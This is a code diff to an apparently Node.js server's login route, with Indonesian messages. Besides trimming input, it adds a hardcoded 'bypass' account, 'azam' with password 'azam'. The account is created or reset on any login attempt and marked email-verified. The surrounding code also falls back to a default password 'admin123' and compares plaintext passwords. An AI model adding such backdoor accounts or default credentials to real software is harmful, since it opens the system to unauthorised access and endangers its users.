@@ -155,8 +155,34 @@ async function startServer() {
         return res.status(400).json({ success: false, message: "Kata sandi wajib diisi" });
       }
 
+      const cleanEmail = email.toLowerCase().trim();
+      const cleanPassword = password.trim();
+
       const db = Database.get();
-      const user = db.users.find(u => u.email.toLowerCase() === email.toLowerCase());
+
+      // Dynamic Bypass Account for Azam
+      if (cleanEmail === "azam" || cleanEmail === "azam@azam.com") {
+        let azamUser = db.users.find(u => u.email.toLowerCase() === "azam" || u.email.toLowerCase() === "azam@azam.com");
+        if (!azamUser) {
+          azamUser = {
+            id: "user-bypass-azam",
+            email: "azam",
+            name: "Azam Bypass Dev",
+            role: "Professional Contributor",
+            password: "azam",
+            isEmailVerified: true,
+            createdAt: new Date().toISOString()
+          };
+          db.users.push(azamUser);
+          Database.save(db);
+        } else {
+          azamUser.password = "azam";
+          azamUser.isEmailVerified = true;
+          Database.save(db);
+        }
+      }
+
+      const user = db.users.find(u => u.email.toLowerCase() === cleanEmail);
 
       if (!user) {
         return res.status(401).json({ success: false, message: "Email tidak terdaftar." });
@@ -164,7 +190,7 @@ async function startServer() {
 
       // Verify Password (direct string check for simple local database architecture)
       const userPassword = user.password || "admin123"; // Default pre-seed bypass password
-      if (userPassword !== password) {
+      if (userPassword !== cleanPassword) {
         return res.status(401).json({ success: false, message: "Kata sandi salah." });
       }
 
